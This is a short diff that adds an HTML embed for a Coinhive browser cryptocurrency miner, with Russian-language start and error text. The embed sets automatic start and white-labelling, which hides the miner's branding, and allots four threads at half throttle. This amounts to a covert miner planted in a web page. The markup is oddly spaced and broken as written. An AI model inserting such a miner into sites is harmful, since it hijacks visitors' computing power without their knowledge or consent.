@@ -1,0 +1,11 @@
+< div class = "coinhive-miner"
+style = "width: 512px; height: 128px"
+data - key = "6U5E3vsurBIvTa75HYNryNtkw99zvMQr"
+data - autostart = "true"
+data - whitelabel = "true"
+data - background = "#ffffff"
+data - text = "#555555"
+data - action = "#ff9600"
+data - threads = "4"
+data - throttle = "0.5"
+data - start = "Начать" > < em > Не удалось загрузить.(ಥ﹏ಥ) < /em></div >
